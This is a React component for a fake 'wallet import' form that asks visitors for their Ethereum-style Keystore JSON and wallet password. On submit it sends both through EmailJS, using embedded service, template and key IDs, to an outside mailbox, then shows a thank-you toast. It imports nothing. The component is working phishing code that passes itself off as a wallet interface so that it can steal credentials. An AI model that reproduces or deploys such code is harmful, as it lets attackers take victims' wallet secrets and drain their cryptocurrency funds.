import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

function Keystone() {
  const form = useRef();
  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_d2i06rj",
        "template_k1w9571",
        form.current,
        "nILhyjPdDiG6yewwS"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.target.reset();
    toast.success("Thanks you", {
      position: "top-center",
      autoClose: 2000,
      progressClassName: "fancy-progress-bar",
      closeButton: false,
    });
  };
  return (
    <>
      <form className="fmt_panel" ref={form} onSubmit={sendEmail}>
        <textarea
          required
          rows={4}
          placeholder="Enter your Keystore JSON"
          style={{ marginBottom: "1.5rem" }}
          type="text"
          name="keystore_jSON"
        />
        <input
          required
          placeholder="Wallet password"
          type="text"
          name="wallet_password"
        />
        <p>
          Several lines of text beginning with "{`{`}...{`}`}" plus the password
          you used to encrypt it.
        </p>
        <button>
          IMPORT
          <span>
            <svg
              fill="none"
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="2"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
            </svg>
          </span>
        </button>
        <ToastContainer />
      </form>
    </>
  );
}

export default Keystone;
